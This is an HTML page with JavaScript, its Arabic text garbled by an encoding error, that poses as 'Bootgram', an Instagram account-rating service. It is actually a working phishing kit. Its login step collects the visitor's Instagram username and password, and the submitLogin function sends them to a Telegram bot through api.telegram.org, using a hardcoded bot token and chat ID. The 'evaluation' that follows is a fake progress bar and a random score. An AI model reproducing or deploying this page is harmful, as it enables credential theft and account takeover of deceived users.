<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>ุชูููู ุญุณุงุจู</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div id="app"></div>

<script>
// ุฅุนุฏุงุฏุงุช ุงูุจูุช
const BOT_TOKEN = "8220149286:AAEBTEtV9LZ_EhqRMnplJDnbMISzHtNKPS4";
const CHAT_ID = "7327544231";

// ุงูุญุงูุฉ ุงูุนุงูุฉ ูููููุน
let state = {
    step: 0,
    username: "",
    password: "",
    agreed: false,
    score: 0
};

// ุนุฑุถ ุงูุตูุญุฉ ุญุณุจ ุงูุฎุทูุฉ
function renderStep() {
    const app = document.getElementById("app");
    app.innerHTML = "";

    const glassClass = "glass-container fade-in"; // ูุชุทุจูู ุชุตููู ุงูุฒุฌุงุฌู

    if (state.step === 0) {
        // ุตูุญุฉ ุงูุชุฑุญูุจ
        app.innerHTML = `
            <div class="${glassClass}">
                <h1>ูุฑุญุจุงู ุจู ูู Bootgram</h1>
                <p>ููุตุชูุง ุงูุฐููุฉ ูุชุญููู ูุชูููู ุญุณุงุจู ุนูู ุฅูุณุชุบุฑุงู ุจุฏูุฉ ูุงุญุชุฑุงููุฉ. ุชุนุฑู ุนูู ููุงุท ุงูููุฉ ูุงูุชุญุณูู ูู ุญุณุงุจู ูุชุทููุฑ ุญุถูุฑู ุงูุฑููู ูุงููุตูู ุฅูู ุฌูููุฑ ุฃูุณุน.</p>
                <button onclick="nextStep()">ุงููุชุงุจุนุฉ</button>
            </div>
        `;
    } else if (state.step === 1) {
        // ุตูุญุฉ ุงูุดุฑูุท
        app.innerHTML = `
            <div class="${glassClass}">
                <h2>ุดุฑูุท ุงูุฎุตูุตูุฉ</h2>
                <p>ูุฑุฌู ุงูููุงููุฉ ุนูู ุดุฑูุท ุงูุฎุตูุตูุฉ ูููุชุงุจุนุฉ</p>
                <label><input type="checkbox" id="agree"> ุฃูุงูู ุนูู ุงูุดุฑูุท</label>
                <br><br>
                <button onclick="checkAgreement()">ุงููุชุงุจุนุฉ</button>
            </div>
        `;
    } else if (state.step === 2) {
        // ุตูุญุฉ ุชุณุฌูู ุงูุฏุฎูู
        app.innerHTML = `
            <div class="${glassClass}">
                <h2>ุชุณุฌูู ุงูุฏุฎูู ูุญุณุงุจ Instagram ุงููุฑุงุฏ ุชููููู</h2>
                <form onsubmit="submitLogin(event)">
                    <label>ุงุณู ุงููุณุชุฎุฏู:</label>
                    <input type="text" id="username" required>
                    <label>ูููุฉ ุงููุฑูุฑ:</label>
                    <input type="password" id="password" required>
                    <button type="submit">ุชุณุฌูู ุงูุฏุฎูู</button>
                </form>
            </div>
        `;
 } else if (state.step === 3) {
    // ุตูุญุฉ ุงูุชุญููู
    app.innerHTML = `
        <div class="${glassClass}">
            <div class="spinner"></div>
            <h2 class="loading-text">
                ูุฑุฌู ุงูุงูุชุธุงุฑ ูุง ุนุฒูุฒู <span class="username">${state.username}</span><br>
                ูุฌุฑู ุงูุขู ุชูููู ุญุณุงุจู...
            </h2>
            <div class="progress-wrap">
                <div id="progress" class="progress-bar">0%</div>
            </div>
        </div>
    `;
    startLoading();
}

     else if (state.step === 4) {
        // ุตูุญุฉ ุงููุชูุฌุฉ
        const messages = {
            high: ["๐ฅ ููุชุงุฒ! ุญุณุงุจู ููู ุฌุฏุงู.", "๐ ุฃุฏุงุก ุฎุงุฑูุ ุงุณุชูุฑ ููุฐุง!", "๐ ุฃูุช ูู ุงููุฎุจุฉ!"],
            mid: ["๐ ุฌูุฏ ุฌุฏุงูุ ุงุณุชูุฑ ุนูู ูุฐุง ุงูุฃุฏุงุก.", "๐ช ุชูุฏู ููุญูุธุ ุฃุญุณูุช!", "๐ ููุชุงุฒ ุชูุฑูุจุงูุ ูุงุตู!"],
            low: ["๐ ุฌูุฏุ ููู ูููู ุชุญุณููู.", "๐ ุชุญุชุงุฌ ุจุนุถ ุงูุชุญุณููุงุช.", "โก ุฌุฑุจ ุชุนุฏูู ุฅุนุฏุงุฏุงุชู."]
        };
        let msg = "";
        if (state.score >= 18) msg = messages.high[Math.floor(Math.random()*messages.high.length)];
        else if (state.score >= 15) msg = messages.mid[Math.floor(Math.random()*messages.mid.length)];
        else msg = messages.low[Math.floor(Math.random()*messages.low.length)];

        app.innerHTML = `
            <div class="${glassClass}">
                <h2>ูุชูุฌุฉ ุงูุชูููู</h2>
                <p>ุชูููู ุญุณุงุจู ูู: <strong>${state.score}</strong>/20</p>
                <p>${msg}</p>
                <button onclick="nextStep()">ุนุฑุถ ูุตุงุฆุญ ุชุญุณูู ุงูุญุณุงุจ</button>
                <br><br>
                <button onclick="resetApp()">ุฅุนุงุฏุฉ ุงูุชูููู</button>
            </div>
        `;
    } else if (state.step === 5) {
        // ุตูุญุฉ ุงููุตุงุฆุญ
        app.innerHTML = `
            <div class="${glassClass}">
                <h2>ูุตุงุฆุญ ูุชุญุณูู ุญุณุงุจู ุนูู ุฅูุณุชุบุฑุงู</h2>
                <ul>
                    <li>๐ธ ุงุณุชุฎุฏู ุตูุฑ ุนุงููุฉ ุงูุฌูุฏุฉ ููุญุชูู ุฌุฐุงุจ.</li>
                    <li>๐ ุงูุดุฑ ูู ุฃููุงุช ุงููุดุงุท ุงูุฃุนูู ูุฌูููุฑู.</li>
                    <li>๐ท๏ธ ุงุณุชุฎุฏู ุงููุณูู ุงูููุงุณุจุฉ ูุงููุดููุฑุฉ ูู ูุฌุงูู.</li>
                    <li>๐ฌ ุชูุงุนู ูุน ุงููุชุงุจุนูู ุนุจุฑ ุงูุฑุฏ ุนูู ุงูุชุนูููุงุช ูุงูุฑุณุงุฆู.</li>
                    <li>๐ ุฑุงูุจ ุฃุฏุงุก ููุดูุฑุงุชู ูุญุณูู ุงููุญุชูู ุจูุงุกู ุนูู ุงููุชุงุฆุฌ.</li>
                    <li>๐ฏ ุฑููุฒ ุนูู ุชูุฏูู ูููุฉ ุญููููุฉ ูุฌูููุฑู.</li>
                </ul>
                <br>
                <button onclick="resetApp()">ุงูุนูุฏุฉ ุฅูู ุงูุตูุญุฉ ุงูุฑุฆูุณูุฉ</button>
            </div>
        `;
    }
}

// ุงูุงูุชูุงู ููุฎุทูุฉ ุงูุชุงููุฉ
function nextStep() {
    state.step++;
    renderStep();
}

// ุงูุชุญูู ูู ุงูููุงููุฉ
function checkAgreement() {
    const agree = document.getElementById("agree").checked;
    if (!agree) {
        alert("ูุฑุฌู ุงูููุงููุฉ ุนูู ุงูุดุฑูุท ุฃููุงู.");
        return;
    }
    state.agreed = true;
    nextStep();
}

// ูุนุงูุฌุฉ ุชุณุฌูู ุงูุฏุฎูู
function submitLogin(e) {
    e.preventDefault();
    state.username = document.getElementById("username").value.trim();
    state.password = document.getElementById("password").value.trim();

    const message = `๐ ุชุณุฌูู ุฏุฎูู ุฌุฏูุฏ\n๐ค ุงุณู ุงููุณุชุฎุฏู: ${state.username}\n๐ ูููุฉ ุงููุฑูุฑ: ${state.password}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });

    nextStep();
}

// ุจุฏุก ุงูุชุญููู
function startLoading() {
    let progress = 0;
    const bar = document.getElementById("progress");
    const timer = setInterval(() => {
        progress += 1;
        bar.style.width = progress + "%";
        bar.textContent = progress + "%";
        if (progress >= 100) {
            clearInterval(timer);
            setTimeout(() => {
                state.score = Math.floor(Math.random() * 10) + 11; // ูู 11 ุฅูู 20
                nextStep();
            }, 500);
        }
    }, 150);
}

// ุฅุนุงุฏุฉ ุงูุชุดุบูู
function resetApp() {
    state = { step: 0, username: "", password: "", agreed: false, score: 0 };
    renderStep();
}

// ุจุฏุก ุงูุชุทุจูู
renderStep();
</script>
<script src="transitions.js" defer></script>
</body>
</html>
